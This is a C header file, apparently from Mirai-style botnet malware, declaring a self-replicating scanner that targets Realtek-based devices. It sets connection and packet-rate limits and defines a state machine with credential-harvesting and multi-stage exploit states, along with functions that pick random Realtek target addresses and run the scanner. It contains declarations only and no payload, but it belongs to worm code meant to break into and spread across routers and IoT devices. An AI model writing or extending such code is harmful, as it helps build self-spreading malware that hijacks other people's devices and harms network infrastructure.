#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#define REALTEK_SCANNER_MAX_CONNS   256
#define REALTEK_SCANNER_RAW_PPS     788

#define REALTEK_SCANNER_RDBUF_SIZE  1080
#define REALTEK_SCANNER_HACK_DRAIN  64

struct realtek_scanner_connection
{
    int fd, last_recv;
    enum
    {
        REALTEK_SC_CLOSED,
        REALTEK_SC_CONNECTING,
        REALTEK_SC_GET_CREDENTIALS,
        REALTEK_SC_EXPLOIT_STAGE2,
        REALTEK_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[REALTEK_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[5000], payload_buf2[5000];
    int credential_index;
};

void realtek_scanner();
void realtek_kill(void);

static void realtek_setup_connection(struct realtek_scanner_connection *);
static ipv4_t get_random_realtek_ip(void);

#endif
